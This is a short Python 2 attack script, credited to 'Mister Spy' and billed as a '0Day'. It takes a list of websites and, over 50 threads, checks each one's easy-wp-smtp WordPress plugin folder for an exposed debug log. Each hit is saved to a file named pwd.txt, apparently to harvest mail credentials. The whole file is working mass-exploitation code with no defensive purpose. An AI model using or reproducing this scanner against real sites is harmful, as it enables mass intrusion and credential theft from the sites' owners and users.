#!/usr/bin/python
# -*-coding:Latin-1 -*
# coding for fun ! else i don't give a shit !  best regards to all <3  , 
import requests
from multiprocessing.dummy import Pool as ThreadPool
import re


def exp(url):
    try:
        url = url.replace('\n', '').replace('\r', '')
        op = requests.get(url + '/wp-content/plugins/easy-wp-smtp/', timeout=7).content
        if "debug_log.txt" in op and "img" not in op:
            filter = re.findall('>(.*?)_debug_log.txt', str(op))[0]
            replace = filter.replace('<td valign="top">&nbsp;</td><td><a href="', '')
            print "[+] Vuln Found " + url + " DebugFile " + replace + '_debug_log.txt'
            open("pwd.txt", "a").write(url + '/wp-content/plugins/easy-wp-smtp/' + replace + '_debug_log.txt' "\n")
        else:
            print '-> ' + url
    except:
        print "timeOut -> " + url
        pass


print("""\033[93m

 __          _______   _____ __  __ _______ _____  
 \ \        / /  __ \ / ____|  \/  |__   __|  __ \ 
  \ \  /\  / /| |__) | (___ | \  / |  | |  | |__) |
   \ \/  \/ / |  ___/ \___ \| |\/| |  | |  |  ___/ 
    \  /\  /  | |     ____) | |  | |  | |  | |     
     \/  \/   |_|    |_____/|_|  |_|  |_|  |_|    0Day 
                                                                                             
 {a}Coded By Mister Spy
 {b}Store : t-shop.to
""".format(a="\033[92m", b="\033[94m"))
try:
    a = raw_input('enter list :')
    ListPass = open(a, 'r').readlines()
    pool = ThreadPool(50)
    pool.map(exp, ListPass)
    pool.close()
    pool.join()
except:
    print 'File not found !!'

if __name__ == '__main__':
    print("Finished, success using Mr Spy Tool 0Day")
